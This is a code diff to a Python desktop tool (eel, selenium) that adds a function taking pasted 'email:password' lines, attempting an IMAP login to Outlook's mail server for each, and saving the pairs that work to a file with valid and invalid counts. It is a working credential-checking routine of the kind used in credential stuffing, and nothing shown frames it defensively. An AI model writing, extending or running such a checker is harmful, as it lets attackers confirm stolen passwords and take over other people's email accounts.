@@ -18,6 +18,35 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.support.ui import WebDriverWait
 eel.init("web")
+@eel.expose
+def emailtest(lines):
+    with open("testingemail.txt", 'r+') as testetx:
+        testetx.seek(0)
+        testetx.truncate()
+    lines = lines.splitlines()
+    totaltest = len(lines)
+    for line in lines:
+        print("processing")
+        try:
+            email_user = line.split(":")[0]
+            email_pass = line.split(":")[1]
+            mail = imaplib.IMAP4_SSL('outlook.office365.com')
+            mail.login(email_user, email_pass)
+            linetp = email_user + ":" + email_pass + "\n"
+            with open("testingemail.txt", 'a+') as testetx:
+                testetx.write(linetp)
+        except:
+            pass
+        outputtest(totaltest)
+def outputtest(totaltest):
+    with open("testingemail.txt", 'r+') as testetx:
+        emailsoutput = testetx.read()
+        emailstestnb = emailsoutput.splitlines()
+        print(emailstestnb)
+        emailstestnb = len(emailstestnb)
+        print(emailstestnb)
+        invalidtest = totaltest - emailstestnb
+        eel.affiche(emailsoutput, emailstestnb, invalidtest)
 captchaIndex = 0
 with open("nb.txt", 'r+') as capn:
     capn.write("0")
